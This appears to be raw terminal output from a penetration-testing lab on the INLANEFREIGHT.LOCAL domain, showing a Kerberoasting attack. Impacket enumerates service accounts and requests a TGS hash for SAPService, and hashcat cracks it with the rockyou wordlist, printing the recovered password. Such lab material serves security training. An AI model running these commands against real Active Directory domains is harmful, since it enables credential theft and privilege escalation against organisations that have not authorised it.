```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend 
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                               Name               MemberOf                                                                                  PasswordLastSet             LastLogon                   Delegation 
-------------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  --------------------------  ----------
MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433  damundsen          CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                         2022-03-24 12:20:34.127432  2026-07-22 04:47:14.606617             
MSSQL/ACADEMY-EA-FILE                              damundsen          CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                         2022-03-24 12:20:34.127432  2026-07-22 04:47:14.606617             
backupjob/veam001.inlanefreight.local              backupagent        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:15:40.842452  2026-07-22 05:00:31.331817             
sts/inlanefreight.local                            solarwindsmonitor  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:14:48.701834  <never>                                
MSSQLSvc/SPSJDB.inlanefreight.local:1433           sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:09:46.326865  <never>                                
MSSQLSvc/SQL-CL01-01inlanefreight.local:49351      sqlqa              CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:10:06.545598  <never>                                
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433      sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:13:31.639334  <never>                                
adfsconnect/azure01.inlanefreight.local            adfs               CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:15:27.108079  <never>                                
testspn/kerberoast.inlanefreight.local             testspn                                                                                                      2022-02-27 15:15:43.406442  <never>                                
testspn2/kerberoast.inlanefreight.local            testspn2                                                                                                     2022-02-27 15:59:39.843945  <never>                                
http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL         certsvc                                                                                                      2022-03-30 15:44:18.414039  2022-03-30 15:50:53.679679             
vmware/inlanefreight.local                         svc_vmwaresso                                                                                                2022-04-05 15:32:46.799565  <never>                                
SAPService/srv01.inlanefreight.local               SAPService         CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL                                 2022-04-18 14:40:02.959792  <never>                                

```

```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend  -request-user SAPService    
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                  Name        MemberOf                                                   PasswordLastSet             LastLogon  Delegation 
------------------------------------  ----------  ---------------------------------------------------------  --------------------------  ---------  ----------
SAPService/srv01.inlanefreight.local  SAPService  CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL  2022-04-18 14:40:02.959792  <never>               



$krb5tgs$23$*SAPService$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SAPService*$2d9792ce3bb3eb1151be1289f5345ed3$acd9e6b69eb8ba95add55b79b5ea17392a77ea528ff477021139280e162fdd1d9a208a1f145a2125ac1b69787ea3202a529adb202829376b18650a5b37142791dc1ced1959be022581e4a54b37ceb5b21c32de6636bd946f41e6a297df1eda2c903b77352a0795c5db5d14653d38202ab8c078921f6d562a0ad1b57e1c7746e887209dad06b802c86afaff4f816bee882398e785d62ed5fa6f1e8886d1ebcaaec7a7a39f101e153f24cc2f06a100056eec30013c411e9a7368e2bf5b96a5ebe77986e788f7a065cfa21b9a201e5ec54f3dd67ffaa13829c945aa81e13509828a2bc7376391826f54c3729cb1701e66798b71701b8e648795b15aa49d3dbbb987996aa4f2e5bcb2a46ef81257f36146d700e6367b5f915999570040af76b69bdd969f7ab901a1724a415222b0b9b41dcb074aba0139f5d373858c123c9e61956d4c14ae8392c0a42a8f6fbe334a49a2050e133606ab6d5836c9b95abbcfc8b6896ef513f804e118cfd035bfb77d4a357661c1eba96c27b73e771cd58605575696a8226d5771b0853c83ad21b6c28c67f8fc220343551444bba9ff5a36032b90b94a82817f92c7eaef96e78cd3f5ea84d0215e8cab5693fdc6e3f57ebc52d71a7605b25ad289f2902847705927abd4a31ac76f4de82c2f73087552533d0bdf4eec504994c6fee92ed553725db8b0134b632a8218ab88112887a8f29d041a30c16a815f147cbe364f75877670c7c31a40e827cc3e1807cc46f336ac9b688d838aee7b1ad1391dde294ba919280bbbf1de31947297c4e5e5f091b0ffda295de0d4d0f0f7d0508393ad9781904a2165903b26a3c1ac1711daab0dbf1fdfb9d626296977e00823d967984842e2ae78ddcc44b84b99778620b6b94e81afaa38fe5bc2a66d25d8d3544ce16f1af616c97186d34d35305623599b6e71a557672d1ff9dc44d49e7ff34f009a85582ae62770a647fe0ed01e926531b8d52597590607493bbf8f5662e15a64dc720ecb8296da30c3ba4ff209ef95d95996d6a22522f1bbac7eba5d2a3497e7e8a64edc420e3d72844eb76e99a76ef70cc96b3f71d535ab610614c28857812d8fcf4c231f372caece9daf6d00556509b4073e2e3671eb31bcc1bd4ebf8767e70fa3e18a055415e1f75f39f01f5f3bea31b21d67702d07f52a2ffb150692dddbbdec68fd2c1387fedf7422949113fb219e26e1b1550b614c75dd7db0b2d63d22f1761d02ed2f7cde6c694ef23c512111cafca0e32621bdd5551a1aad82e60a8497f015f76119999da535c41f6fe04e74d693a51aba788f2dfa8159b4a667a0c852f178c439967a9ec16b4822760be83484e58aca315bb80c18ef2c424d465f1839f7820ad624f12864c5610265c19355bbb9432e71d57f42069dd5aa1a6ae2234f08aa0ce5ec718133d6c28b

```

```
hashcat -m 13100 sapservice /home/satoru/Desktop/HACKVISER/CAPT/rockyou.txt 
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Ryzen 7 4800H with Radeon Graphics, 2204/4409 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (1018 MB free)

Dictionary cache hit:
* Filename..: /home/satoru/Desktop/HACKVISER/CAPT/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$krb5tgs$23$*SAPService$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SAPService*$2d9792ce3bb3eb1151be1289f5345ed3$acd9e6b69eb8ba95add55b79b5ea17392a77ea528ff477021139280e162fdd1d9a208a1f145a2125ac1b69787ea3202a529adb202829376b18650a5b37142791dc1ced1959be022581e4a54b37ceb5b21c32de6636bd946f41e6a297df1eda2c903b77352a0795c5db5d14653d38202ab8c078921f6d562a0ad1b57e1c7746e887209dad06b802c86afaff4f816bee882398e785d62ed5fa6f1e8886d1ebcaaec7a7a39f101e153f24cc2f06a100056eec30013c411e9a7368e2bf5b96a5ebe77986e788f7a065cfa21b9a201e5ec54f3dd67ffaa13829c945aa81e13509828a2bc7376391826f54c3729cb1701e66798b71701b8e648795b15aa49d3dbbb987996aa4f2e5bcb2a46ef81257f36146d700e6367b5f915999570040af76b69bdd969f7ab901a1724a415222b0b9b41dcb074aba0139f5d373858c123c9e61956d4c14ae8392c0a42a8f6fbe334a49a2050e133606ab6d5836c9b95abbcfc8b6896ef513f804e118cfd035bfb77d4a357661c1eba96c27b73e771cd58605575696a8226d5771b0853c83ad21b6c28c67f8fc220343551444bba9ff5a36032b90b94a82817f92c7eaef96e78cd3f5ea84d0215e8cab5693fdc6e3f57ebc52d71a7605b25ad289f2902847705927abd4a31ac76f4de82c2f73087552533d0bdf4eec504994c6fee92ed553725db8b0134b632a8218ab88112887a8f29d041a30c16a815f147cbe364f75877670c7c31a40e827cc3e1807cc46f336ac9b688d838aee7b1ad1391dde294ba919280bbbf1de31947297c4e5e5f091b0ffda295de0d4d0f0f7d0508393ad9781904a2165903b26a3c1ac1711daab0dbf1fdfb9d626296977e00823d967984842e2ae78ddcc44b84b99778620b6b94e81afaa38fe5bc2a66d25d8d3544ce16f1af616c97186d34d35305623599b6e71a557672d1ff9dc44d49e7ff34f009a85582ae62770a647fe0ed01e926531b8d52597590607493bbf8f5662e15a64dc720ecb8296da30c3ba4ff209ef95d95996d6a22522f1bbac7eba5d2a3497e7e8a64edc420e3d72844eb76e99a76ef70cc96b3f71d535ab610614c28857812d8fcf4c231f372caece9daf6d00556509b4073e2e3671eb31bcc1bd4ebf8767e70fa3e18a055415e1f75f39f01f5f3bea31b21d67702d07f52a2ffb150692dddbbdec68fd2c1387fedf7422949113fb219e26e1b1550b614c75dd7db0b2d63d22f1761d02ed2f7cde6c694ef23c512111cafca0e32621bdd5551a1aad82e60a8497f015f76119999da535c41f6fe04e74d693a51aba788f2dfa8159b4a667a0c852f178c439967a9ec16b4822760be83484e58aca315bb80c18ef2c424d465f1839f7820ad624f12864c5610265c19355bbb9432e71d57f42069dd5aa1a6ae2234f08aa0ce5ec718133d6c28b:!SapperFi2
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*SAPService$INLANEFREIGHT.LOCAL$INLANEF...d6c28b
Time.Started.....: Fri Jul 31 18:34:01 2026 (29 secs)
Time.Estimated...: Fri Jul 31 18:34:30 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/home/satoru/Desktop/HACKVISER/CAPT/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:   532.9 kH/s (2.13ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 14344192/14344384 (100.00%)
Rejected.........: 0/14344192 (0.00%)
Restore.Point....: 14340096/14344384 (99.97%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: !caroline ->  kristenanne
Hardware.Mon.#01.: Util: 46%

Started: Fri Jul 31 18:33:58 2026
Stopped: Fri Jul 31 18:34:32 2026

```

